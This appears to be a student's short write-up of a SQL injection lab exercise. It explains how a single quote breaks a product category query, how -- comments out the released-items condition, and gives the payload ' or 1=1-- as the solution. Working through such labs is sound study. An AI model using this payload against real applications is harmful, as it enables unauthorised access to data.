SQL Injection - Product Category Filter

SELECT * FROM products WHERE category = 'Gifts' AND released = 1

End Goal : display details of all products in any any category, both released and unreleased. 

Analysis

SELECT * FROM products WHERE category = 'Gifts' AND released = 1

using ' shows Internal Server Error means ' is being parsed and broke the application
    SELECT * FROM products WHERE category = ''' AND released = 1

SELECT * FROM products WHERE category = ''--' AND released = 1
    -- comment field to ignore the rest of query.
    it will only run the below
    SELECT * FROM products WHERE category = '' (-- after it is being commented)

To solve the excersice
SELECT * FROM products WHERE category = '' or 1=1 --' AND released = 1
    i am telling it that '' is empty or 1=1 which is always true and again -- will ignore what after it.
    so we use ' or 1=1--
